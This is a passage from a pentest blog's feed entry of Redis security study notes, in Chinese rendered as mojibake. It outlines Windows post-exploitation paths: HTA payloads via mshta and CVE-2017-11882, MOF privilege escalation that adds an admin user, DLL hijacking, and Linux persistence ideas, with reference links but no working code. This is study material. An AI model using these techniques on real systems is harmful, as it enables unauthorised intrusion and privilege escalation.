‡æœºå™¨ã€‚ã€‚ä¸è¿‡æ¯æ¬¡é‡å¯ä¹‹åï¼Œè¿˜è¦åˆ‡æ¢æˆAdministratorè´¦æˆ·ï¼Œæ‰ä¼šæ”¶åˆ°sessionæˆ–è€…è¯´ä¸Šçº¿ã€‚<br><img src="https://i.imgur.com/ZY8Ae2n.png"></p><p><img src="https://i.imgur.com/VV6WV5W.png"></p><p>å…³äº mshta.exeçš„ç§‘æ™®ï¼š<a href="https://baike.baidu.com/item/Mshta.exe/10666591">https://baike.baidu.com/item/Mshta.exe/10666591</a></p><p><a href="http://jincheng.xpcha.com/675nabeltqm/">http://jincheng.xpcha.com/675nabeltqm/</a></p><p>è‹±æ–‡å…¨ç§°Microsoft HTML Applicationï¼Œå¯ç”¨äºæ‰§è¡Œ.HTA æ–‡ä»¶ï¼Œæ˜¯å¾®è½¯è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€åº”ç”¨ã€‚</p><p>è€Œåœ¨ä¹‹å‰é‚£ä¸ªPS_Shell.rb çš„æºç ä¸­ï¼Œåˆ©ç”¨çš„æ˜¯ CVE-2017-11882ï¼Œå…¶ä¸­æœ‰ä¸€æ®µæ³¨é‡Š</p><p>This module generates an command to place within a word document, that when executed, will retrieve a HTA payload via HTTP from an web server. Currently have not figured out how to generate a doc.</p><p>æ¼æ´åˆ†æï¼š<a href="https://www.anquanke.com/post/id/87311">https://www.anquanke.com/post/id/87311</a> æ¼æ´ç±»å‹ï¼šæ ˆæº¢å‡ºæ¼æ´å¯¼è‡´å†…å­˜æŸå</p><h3 id="å†™å…¥MOF"><a href="#å†™å…¥MOF" class="headerlink" title="å†™å…¥MOF"></a>å†™å…¥MOF</h3><p>ç¯å¢ƒå¿…é¡»ä¸ºWindows 2003ï¼Œæ¯”è¾ƒä¹…è¿œçš„ææƒæ–¹æ³•ã€‚è¿™é‡Œä¸å¤ç°äº†ï¼Œäº†è§£ä¸€ä¸‹å§ã€‚å¦‚æœæœ‰æœºä¼šä¼šç”¨åˆ°ï¼Œè‡³å°‘è¦çŸ¥é“ã€‚<br>mofæ˜¯windowsç³»ç»Ÿçš„ä¸€ä¸ªæ–‡ä»¶ï¼ˆåœ¨c:/windows/system32/wbem/mof/nullevt.mofï¼‰å«åšâ€æ‰˜ç®¡å¯¹è±¡æ ¼å¼â€å…¶ä½œç”¨æ˜¯æ¯éš”äº”ç§’å°±ä¼šå»ç›‘æ§è¿›ç¨‹åˆ›å»ºå’Œæ­»äº¡ã€‚å…¶å°±æ˜¯ç”¨åˆäº†mysqlçš„rootæƒé™äº†ä»¥åï¼Œç„¶åä½¿ç”¨rootæƒé™å»æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„mofã€‚éš”äº†ä¸€å®šæ—¶é—´ä»¥åè¿™ä¸ªmofå°±ä¼šè¢«æ‰§è¡Œï¼Œè¿™ä¸ªmofå½“ä¸­æœ‰ä¸€æ®µæ˜¯vbsè„šæœ¬ï¼Œè¿™ä¸ªvbså¤§å¤šæ•°çš„æ˜¯cmdçš„æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·çš„å‘½ä»¤ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´åœ¨c:/windows/system32/wbem/mof/ç›®å½•ä¸‹çš„mofæ–‡ä»¶ä¼šæ¯5ç§’è‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡ï¼Œè¿™æ ·å°±ä¸éœ€è¦é‡å¯æœºå™¨å°±èƒ½è·å–æƒé™äº†ã€‚</p><p>è¿™ç§åˆ©ç”¨æ–¹å¼ä¸ç”¨é‡å¯ç›®æ ‡æœºå™¨ï¼Œä¹Ÿä¸éœ€è¦è·å–ç›®æ ‡Webçš„ç‰©ç†è·¯å¾„ï¼Œåªæ˜¯ç¯å¢ƒå¿…é¡»æ˜¯Windows 2003</p><h3 id="DLL-åŠ«æŒ"><a href="#DLL-åŠ«æŒ" class="headerlink" title="DLL åŠ«æŒ"></a>DLL åŠ«æŒ</h3><p>è¿™ç§åˆ©ç”¨æ–¹æ³•å’Œä¸‹é¢çš„å¿«æ·æ–¹å¼è¦†å†™è¯·å‚è€ƒR3startå¤§ä½¬çš„æ–‡ç« ï¼š<a href="http://r3start.net/index.php/2020/05/25/717">http://r3start.net/index.php/2020/05/25/717</a></p><h3 id="å¿«æ·æ–¹å¼è¦†å†™"><a href="#å¿«æ·æ–¹å¼è¦†å†™" class="headerlink" title="å¿«æ·æ–¹å¼è¦†å†™"></a>å¿«æ·æ–¹å¼è¦†å†™</h3><h2 id="å¦‚ä½•é˜²å¾¡"><a href="#å¦‚ä½•é˜²å¾¡" class="headerlink" title="å¦‚ä½•é˜²å¾¡"></a>å¦‚ä½•é˜²å¾¡</h2><p>å‚è€ƒä¸Šé¢çš„æ¼æ´ä¿®å¤</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>Windowsä¸‹çš„åˆ©ç”¨æ€è·¯ï¼Œå…¶å®å‰ä¸¤å¼ å’ŒLinuxä¸‹æ˜¯ä¸€æ ·çš„ã€‚ç”šè‡³æ¯”Linux ä¸‹è¿˜é¸¡è‚‹ï¼Œæ¯•ç«ŸLinux ä¸‹çš„web ç›®å½•æ˜¯å¯ä»¥çŒœæµ‹çš„ï¼ˆå°±é‚£ä¹ˆå‡ ä¸ªã€‚å†™å…¥MOFï¼Œå‰å‡ å¤©åœ¨å…ˆçŸ¥ç¤¾åŒºä¹Ÿæœ‰äººå‘äº†æ–‡ç« äº†ï¼Œ<a href="https://xz.aliyun.com/t/7940#toc-6">https://xz.aliyun.com/t/7940#toc-6</a></p><p>DLL åŠ«æŒ å’Œ å¿«æ·æ–¹å¼è¦†å†™é¢†ä¼šæ€è·¯å’ŒåŸç†å§ï¼Œä¸æƒ³å¤ç°äº†ï¼Œæœ€è¿‘äº‹æƒ…å¤ªå¤šäº†ã€‚ï¼ˆåŸ‹å‘ã€‚</p><p>å¦å¤–ï¼ŒLinux ä¸‹è¿˜æœ‰å¦‚ä¸‹åˆ©ç”¨æ–¹æ³•ï¼š</p><p>å†™å…¥åˆ°/etc/profile.d/ç”¨æˆ·ç¯å¢ƒå˜é‡<br>å¼€å¯AOFæŒä¹…åŒ–çº¯æ–‡æœ¬è®°å½•appendfilename<br>è¿™é‡Œï¼Œå°±å…ˆä¸ç ”ç©¶äº†ï¼Œæ„Ÿè§‰ç›®å‰ç”¨ä¸åˆ°ï¼Œäº†è§£ä¸€ä¸‹å°±è¡Œäº†ã€‚</p><h2 id="ç›¸å…³èµ„æ–™"><a href="#ç›¸å…³èµ„æ–™" class="headerlink" title="ç›¸å…³èµ„æ–™"></a>ç›¸å…³èµ„æ–™</h2><p><a href="https://www.anquanke.com/post/id/170360">https://www.anquanke.com/post/id/170360</a></p><p><a href="https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html">https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</a> Redis åœ¨Windows ä¸‹ å¦‚ä½•Getshell</p><p><a href="https://xz.aliyun.com/t/7940#toc-6">https://xz.aliyun.com/t/7940#toc-6</a> Redis Windows è¸©å‘</p><p>æ¢è¡Œç¬¦ï¼š<a href="https://blog.csdn.net/CJF_iceKing/article/details/47836201">https://blog.csdn.net/CJF_iceKing/article/details/47836201</a></p><p>Windows å¼€æœºå¯åŠ¨é¡¹ï¼š<a href="http://www.win10xiazai.com/win10/5334.html">http://www.win10xiazai.com/win10/5334.html</a></p><p>GetShell ï¼š<a href="https://cloud.tencent.com/developer/article/1488184">https://cloud.tencent.com/developer/article/1488184</a></p><p>MOFææƒï¼š</p><p><a href="https://www.cnblogs.com/xishaonian/p/6384535.html">https://www.cnblogs.com/xishaonian/p/6384535.html</a><br><a href="https://pino-hd.github.io/2018/06/10/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BMOF/">https://pino-hd.github.io/2018/06/10/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BMOF/</a><br>DLLåŠ«æŒ&amp;&amp;INK è¦†å†™ æ¥åˆ©ç”¨redisï¼š<a href="http://r3start.net/index.php/2020/05/25/717">http://r3start.net/index.php/2020/05/25/717</a> ï¼Œå·¥å…·ä¹Ÿæ˜¯è¿™ä½å¸ˆå‚…å†™çš„ï¼Œæ„Ÿè§‰å¥½å¼ºã€‚</p><p>DLL åŠ«æŒå‚è€ƒï¼š</p><p><a href="https://evilwing.me/2019/12/30/dll-zhu-ru-dll-jie-chi/">https://evilwing.me/2019/12/30/dll-zhu-ru-dll-jie-chi/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æœ€è¿‘æ”¾å‡ºæ¥çš„æ–‡ç« éƒ½æ˜¯ä»¥å‰æ—©å°±æ€»ç»“å¥½çš„äº†ã€‚&lt;/p&gt;
&lt;h1 id=&quot;Redis-å®‰å…¨å­¦ä¹ ç¬”è®°&quot;&gt;&lt;a href=&quot;#Redis-å®‰å…¨å­¦ä¹ ç¬”è®°&quot; class=&quot;headerlink&quot; title=&quot;Redis å®‰å…¨å­¦ä¹ ç¬”è®°&quot;&gt;&lt;/a&gt;Redis å®‰å…¨å­¦ä¹ ç¬”è®°&lt;/h1&gt;&lt;p&gt;&lt;a</summary>
      
    
    
    
    <category term="æ¸—é€æµ‹è¯•" scheme="https://hack-for.fun/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Redis" scheme="https://hack-for.fun/tags/Redis/"/>
    
  </entry>
  
</feed>
